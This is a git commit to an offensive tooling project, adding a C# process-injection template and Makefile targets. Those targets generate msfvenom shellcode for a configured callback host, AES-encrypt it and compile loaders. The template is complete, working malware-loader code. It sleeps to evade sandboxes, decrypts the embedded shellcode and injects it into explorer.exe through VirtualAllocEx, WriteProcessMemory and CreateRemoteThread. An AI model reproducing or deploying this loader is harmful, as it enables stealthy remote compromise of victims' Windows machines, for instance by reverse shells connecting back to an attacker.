a500669bf5e8a66795ef070048a955727be8590d
Pidone <pd@secfault.org>
2025-03-16 17:27:39 +0100

    Add process injection template

--- Makefile
+++ Makefile
@@ -10,15 +10,12 @@ all: classic classic_aes
 sources:
 	mkdir sources
 
-output:
-	mkdir output
-
 classic.cs: sources templates/classic.cs
 	export PAYLOAD=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f csharp); \
 	cat templates/classic.cs | envsubst > sources/classic.cs
 
-classic: output classic.cs
-	mcs -out:output/classic.exe sources/classic.cs
+classic.exe: classic.cs
+	mcs -out:classic.exe sources/classic.cs
 	@echo $(LISTENER_CMD)
 
 classic_aes.cs: sources templates/classic_aes.cs
@@ -28,11 +25,25 @@ classic_aes.cs: sources templates/classic_aes.cs
 	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
 	cat templates/classic_aes.cs | envsubst > sources/classic_aes.cs
 
-classic_aes: output classic_aes.cs
-	mcs -out:output/classic_aes.exe sources/classic_aes.cs
+classic_aes.exe: classic_aes.cs
+	mcs -out:classic_aes.exe sources/classic_aes.cs
+	@echo $(LISTENER_CMD)
+
+sources/process_inject.cs: sources templates/process_inject.cs
+	# hexdump -vn16 -e'4/8 "%08x" 1 "\n"' /dev/urandom ??
+	export KEY=$$(uuidgen | tr -d "-"); \
+	export IV=$$(uuidgen | tr -d "-"); \
+	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
+	cat templates/process_inject.cs | envsubst > sources/process_inject.cs
+
+
+process_inject.exe: sources/process_inject.cs
+	mcs -out:process_inject.exe sources/process_inject.cs
 	@echo $(LISTENER_CMD)
 
 clean:
 	rm -rf \
 		sources \
-		output
+		classic.exe \
+		classic_aes.exe \
+		process_inject.exe
---
+++ templates/process_inject.cs
@@ -0,0 +1,82 @@
+using System;
+using System.Linq;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
+[ComVisible(true)]
+public class Program {
+  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+  static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+  static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+  static extern IntPtr VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flProtect, out UInt32 lpflOldProtect);
+  [DllImport("kernel32.dll")]
+  static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+  [DllImport("kernel32.dll")]
+  static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  [DllImport("kernel32.dll")]
+  static extern void Sleep(uint dwMilliseconds);
+
+  public static byte[] StringToByteArray(String hex) {
+    int NumberChars = hex.Length;
+    byte[] bytes = new byte[NumberChars / 2];
+    for (int i = 0; i < NumberChars; i += 2) {
+      bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+    }
+    return bytes;
+  }
+
+  public void Run(string target) {
+
+    DateTime t1 = DateTime.Now;
+    Sleep(5000);
+    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+    if (t2 < 4.5)
+    {
+        return;
+    }
+
+    string bufEnc = "${BASE64_SHELLCODE}";
+    string key = "${KEY}";
+    string iv = "${IV}";
+
+    // Decrypt shellcode
+    Aes aes = Aes.Create();
+    byte[] k = StringToByteArray(key);
+    byte[] i = StringToByteArray(iv);
+    ICryptoTransform decryptor = aes.CreateDecryptor(k, i);
+    byte[] buf;
+    using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc))) {
+      using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) {
+        using (var msPlain = new System.IO.MemoryStream()) {
+          csDecrypt.CopyTo(msPlain);
+          buf = msPlain.ToArray();
+        }
+      }
+    }
+
+    Process[] localByName = Process.GetProcessesByName(target);
+    IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
+
+    // Allocate RW space for shellcode
+    IntPtr lpStartAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32) buf.Length, 0x3000, 0x04);
+
+    // Copy shellcode into allocated space
+    IntPtr outSize;
+    WriteProcessMemory(hProcess, lpStartAddress, buf, buf.Length, out outSize);
+
+    // Make shellcode in memory executable
+    UInt32 lpflOldProtect;
+    VirtualProtectEx(hProcess, lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);
+
+    // Execute the shellcode in a new thread
+    CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpStartAddress, IntPtr.Zero, 0, IntPtr.Zero);
+  }
+
+  public static void Main(string[] args) {
+    Program p = new Program();
+    p.Run("explorer");
+  }
+}
